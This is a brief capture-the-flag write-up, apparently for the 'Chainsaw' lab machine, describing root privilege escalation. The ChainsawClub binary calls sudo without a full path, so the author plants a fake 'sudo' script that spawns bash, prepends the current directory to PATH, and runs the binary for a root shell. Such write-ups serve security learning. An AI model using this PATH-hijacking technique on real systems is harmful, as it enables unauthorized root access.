# Alternative way to exploit Chainsaw

## Privilege Escalation to root

When looking at the traces of the _ChainsawClub_ binary with `strings` or `ltrace`, it shows that it gets executed with `sudo`
```markdown
(...)
sudo -i -u root /root/ChainsawClub/dist/ChainsawClub/ChainsawClub
(...)
```

As it doesn't specify the full path of `sudo`, it is possible to create our own script called _"sudo"_ and execute whatever we want.
Before this can work, is has to be clarified that the current path is the first path it should look for `sudo`.

Contents of the new _"sudo"_ script:
```markdown
#!/bin/bash

bash
```
```markdown
chmod +x sudo
```

Setting current path in the _PATH environment variable_:
```markdown
export PATH=$(pwd):$PATH
```
```markdown
echo $PATH

# Output
/home/bobby/projects/ChainsawClub:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

The first path it will look for `sudo` now is in the current directory, where also the binary is placed.
```markdown
./ChainsawClub
```

After executing the binary _ChainsawClub_, it will start a bash session as root!
